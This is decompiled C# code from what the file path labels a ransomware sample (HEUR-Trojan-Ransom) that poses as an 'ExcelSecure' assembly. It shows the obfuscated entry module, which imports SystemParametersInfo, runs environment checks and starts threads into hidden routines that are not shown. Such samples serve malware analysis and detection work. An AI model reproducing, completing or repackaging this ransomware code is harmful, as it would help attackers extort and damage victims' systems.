// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: ExcelSecure, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3DF6910A-C42C-4EF9-88D0-6212C444355A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-248e9b6751d0c1f6d0f290f8d6bd7fca60eb0ef0821720de80dd3a4d007674d1.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  private static readonly byte[] GetElementType;
  private static string BitDecrement;
  private static string ThreadPriority;
  public static string get_Enabled;
  public static bool GenericMethodInfo;
  public static string PARAMFLAG_FHASCUSTDATA;

  [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto)]
  private static extern int MaxNumber(uint _param0, uint _param1, string _param2, uint _param3);

  private static void IEqualityComparer__1(string[] _param0)
  {
    if (Wait.Tasks())
    {
      new Thread((ThreadStart) (() => Wait.Callbacks())).Start();
    }
    else
    {
      if (Wait.NoFreeBuffers())
        Environment.Exit(Wait.ControlAppDomain.R8);
      if (Wait.ThreadTransferSendObj)
        Wait.ETXTBSY();
      if (Wait.ReadUInt32)
        Wait.TypeLoadException(Wait.POSIX_FADV_DONTNEED);
      else if (Wait.__c__DisplayClass0_4)
        Wait.NodeKeyValueEnumerator(Wait.POSIX_FADV_DONTNEED);
      if (Wait.sb)
        Wait.W();
      if (Wait.ReadUInt32)
      {
        if (Wait.EPROTOTYPE)
          Wait.ReadDecimal();
        if (Wait.NativeOverlapped)
          Wait.EnumInfo();
        if (Wait.EINVAL)
          Wait.TimeZoneDisplayNameType();
        if (Wait.U2)
          Wait.AddScalar();
      }
      Wait.get_Execution();
      if (Wait.GenericTypeArguments)
        Wait.InterfaceType(Wait.FormatStubInfo);
      Wait.GetAllFuncCustData();
      Wait.SubtractRoundedHighNarrowingLower(Wait.Extended_Pictograph);
      new Thread((ThreadStart) (() => Wait.Callbacks())).Start();
    }
  }
}
